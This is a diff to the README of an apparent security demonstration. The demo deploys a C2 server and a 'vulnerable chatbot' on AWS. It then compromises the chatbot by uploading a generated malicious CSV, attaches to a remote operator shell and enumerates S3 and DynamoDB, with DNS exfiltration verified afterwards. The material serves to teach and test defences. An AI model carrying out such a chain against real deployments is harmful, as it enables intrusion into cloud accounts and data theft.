@@ -113,22 +113,33 @@ The enhanced demo shows that an attacker with **NO AWS credentials** to the vict
 
 ### Quick Start (Realistic Demo)
 
+**Prerequisites:** Install [uv](https://docs.astral.sh/uv/getting-started/installation/) for Python dependency management.
+
+**Terminal 1 - Deploy attacker infrastructure:**
 ```bash
-# Terminal 1: Deploy attacker infrastructure
 cd attacker-infra
-make setup    # Create venv and install c2 CLI
-make deploy   # Deploy infrastructure (auto-generates .env)
+make setup    # Install dependencies with uv
+make deploy   # Deploy C2 server to AWS
+```
 
-# Terminal 2: Deploy victim infrastructure (separate AWS account recommended)
+**Terminal 2 - Deploy victim infrastructure** (separate AWS account recommended):
+```bash
 cd victim-infra
-make deploy
+make setup    # Install dependencies with uv
+make deploy   # Deploy vulnerable chatbot to AWS
+make show-url # Note the chatbot URL
+```
 
-# Terminal 1: Launch attack (note the session ID in output)
-make attack TARGET=$(cd ../victim-infra/terraform && terraform output -raw chatbot_url)
+**Terminal 3 - Launch the attack** (from repo root):
+```bash
+# Generate malicious CSV (session ID saved to attacker-infra/.session_id)
+make generate-csv
 
-# Terminal 1: Attach to compromised session (use session ID from attack output)
-make attach SESSION=sess_abc123
-# In operator shell:
+# Upload attacker-infra/malicious_data.csv to the victim chatbot URL
+# Then attach to the session:
+make attach
+
+# In the operator shell, run commands:
 # > whoami
 # > aws s3 ls
 # > aws dynamodb list-tables
@@ -145,6 +156,8 @@ make attach SESSION=sess_abc123
 - Terraform installed with the latest provider
 
 ### Step 1: Deploy C2 Infrastructure
+
+**Prerequisites:** Install [uv](https://docs.astral.sh/uv/getting-started/installation/) for Python dependency management.
 
 First, edit the `attacker-infra/terraform/terraform.tfvars` file to set your domain name and AWS region:
 
@@ -164,7 +177,7 @@ Deploy the C2 server infrastructure:
 ```bash
 cd attacker-infra
 
-# Set up Python environment and install c2 CLI
+# Install dependencies with uv
 make setup
 
 # Deploy infrastructure (auto-generates .env with EC2_IP, DOMAIN, etc.)
@@ -185,11 +198,13 @@ Then either:
 
 ### Step 3: Attach to Session
 
-Use the session ID from the payload generation step:
+The session ID is saved to `.session_id` automatically, so just run:
 
 ```bash
-make attach SESSION=sess_abc123
+make attach
 ```
+
+(Or specify manually: `make attach SESSION=sess_abc123`)
 
 ### Step 4: Verify DNS Exfiltration
 
